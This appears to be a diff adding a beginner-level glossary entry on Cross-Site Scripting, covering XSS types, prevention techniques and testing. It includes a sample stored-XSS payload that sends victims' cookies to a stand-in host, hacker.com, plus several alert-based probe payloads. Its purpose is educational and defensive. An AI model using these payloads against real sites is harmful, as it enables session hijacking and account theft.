@@ -1,0 +1,98 @@
+---
+slug: "xss"
+term: "Cross-Site Scripting"
+abbreviation: "XSS"
+shortDefinition: "A security vulnerability that allows attackers to inject malicious scripts into web pages viewed by other users."
+category: "OWASP Top 10"
+tags: ["web-security", "injection", "client-side", "javascript"]
+relatedTerms: ["sql-injection", "csrf", "content-security-policy"]
+language: "en"
+hasTranslation: true
+translationSlug: "xss"
+difficulty: "intermediate"
+lastUpdated: "2026-02-23"
+sources:
+  - "https://owasp.org/www-community/attacks/xss/"
+  - "https://portswigger.net/web-security/cross-site-scripting"
+---
+
+## What is Cross-Site Scripting?
+
+In one sentence: When hacker can put malicious JavaScript code on your website and when other users open the site, that code gets executed!
+
+Imagine you have a bulletin board in your neighborhood. Anyone can put notes. A hacker comes and puts a note that when someone reads it, they unconsciously give their wallet to the hacker! XSS is the same — hacker puts JavaScript code on your website, other users who come see the site, the code executes and their data gets stolen.
+
+### Types of XSS:
+
+**Reflected XSS:** Malicious code is in the URL. User clicks the link, code executes. Usually comes with phishing.
+
+**Stored XSS:** Malicious code is stored in the database. Anyone who opens the page, the code executes. More dangerous!
+
+**DOM XSS:** Malicious code executes in the user's browser, without reaching the server.
+
+### XSS Example:
+
+Imagine you have a website that takes and displays comments:
+```html
+<div>User comment: [user comment]</div>
+```
+
+Hacker puts comment:
+```html
+<script>document.location='https://hacker.com/steal?cookie='+document.cookie</script>
+```
+
+When another user opens the page, this code executes and user's cookie gets sent to the hacker! Hacker can use the cookie to access user's account.
+
+### Why is it important for security?
+
+Because XSS can lead to Session theft, personal information theft, Redirect to phishing site, or even performing actions on behalf of the user.
+
+### Input Validation
+Always validate and sanitize user input on the server side:
+
+```javascript
+// Good practice
+const sanitizeInput = (input) => {
+  return input.replace(/[<>\"']/g, (char) => {
+    const entities = {
+      '<': '&lt;',
+      '>': '&gt;',
+      '"': '&quot;',
+      "'": '&#x27;'
+    };
+    return entities[char];
+  });
+};
+```
+
+### Output Encoding
+Encode data before inserting it into HTML, JavaScript, CSS, or URLs:
+
+```javascript
+// Using a library like DOMPurify
+import DOMPurify from 'dompurify';
+const clean = DOMPurify.sanitize(dirty);
+```
+
+### Content Security Policy (CSP)
+Implement CSP headers to restrict which scripts can execute:
+
+```http
+Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-random123'
+```
+
+### Use Modern Frameworks
+Modern frameworks like React, Vue, and Angular provide automatic XSS protection through template escaping.
+
+## Testing for XSS
+
+Common XSS payloads for testing:
+
+```javascript
+<script>alert('XSS')</script>
+<img src=x onerror=alert('XSS')>
+<svg onload=alert('XSS')>
+```
+
+Always test in a controlled environment with proper authorization.
